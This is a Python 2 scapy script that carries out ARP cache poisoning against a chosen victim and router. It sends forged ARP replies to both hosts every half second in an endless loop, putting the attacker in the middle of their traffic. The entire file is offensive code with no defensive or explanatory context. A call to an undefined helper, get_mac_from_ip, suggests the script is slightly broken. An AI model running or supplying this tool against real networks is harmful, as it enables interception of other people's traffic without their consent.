#!/usr/bin/python
from scapy.all import *
import helpers
import argparse
import signal
import sys
import logging
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
	parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
	parser.add_argument("-vmac", "--victimMAC", help="Choose the victim MAC address. Example: -r 00:11:22:33:44:55")
	parser.add_argument("-rmac", "--routerMAC", help="Choose the router MAC address. Example: -r 11:22:33:44:55:66")
	return parser.parse_args()
def poison(routerIP, victimIP, routerMAC, victimMAC):
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC),verbose=False)
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC),verbose=False)
def main(args):
	if os.geteuid() != 0:
		sys.exit("[!] Please run as root")
	routerIP = args.routerIP
	victimIP = args.victimIP
	routerMAC = args.routerMAC
	victimMAC = args.victimMAC
	if(routerMAC == None):
		routerMAC = get_mac_from_ip(routerIP)
	if(victimMAC == None):
		victimMAC = get_mac_from_ip(victimIP)
	print "Poisoning router ---> IP: "+routerIP+"  Mac Address: "+routerMAC+"\n"+"Poisoning victim ---> IP: "+victimIP+"  Mac Address: "+victimMAC

	while 1:
		poison(routerIP, victimIP, routerMAC, victimMAC)
		time.sleep(0.5)
main(parse_args())
